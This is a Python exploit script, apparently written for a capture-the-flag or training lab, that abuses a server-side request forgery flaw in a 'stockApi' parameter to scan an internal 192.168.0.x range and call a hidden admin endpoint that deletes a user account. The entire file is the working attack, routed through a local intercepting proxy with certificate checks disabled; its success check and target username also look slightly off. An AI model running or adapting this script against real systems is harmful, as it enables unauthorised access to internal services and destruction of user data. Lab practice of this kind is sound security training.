import sys
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}

def ssrf_attack(url):
    path = "/product/stock"
    
    # check which IP host the application
    for i in range (1,255):
        data_ip_app = {'stockApi': 'http://192.168.0.%s:8080'%i}
        res = requests.post(url + path, data = data_ip_app, proxies = proxies, verify = False)

        if "Not Found" in res.text:
            data_delete = {'stockApi' : data_ip_app["stockApi"]+"/admin/delete?username=carlo"}
            res_delete = requests.post(url + path, data = data_delete, verify = False, proxies = proxies)

            admin_path = {'stockApi' : data_ip_app["stockApi"]+"/admin"}
            res_admin = requests.post(url + path, data = admin_path, verify = False, proxies = proxies)
            
            if "User deleted successfully!" in res_admin.text:
                return True
            else:
                return False
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] invalid input")
        print("[-] usage: %s <url>" %sys.argv[0])
        print("[-] exiting...")
        sys.exit(-1)

    ssrf_attack_return = ssrf_attack(url)

    if ssrf_attack_return:
        print("[+] user deleted successfully")
        print("[+] exiting...")
        sys.exit(-1)
    else:
        print("[-] failed to deleted the user")
        print("[-] exiting...")
        sys.exit(-1)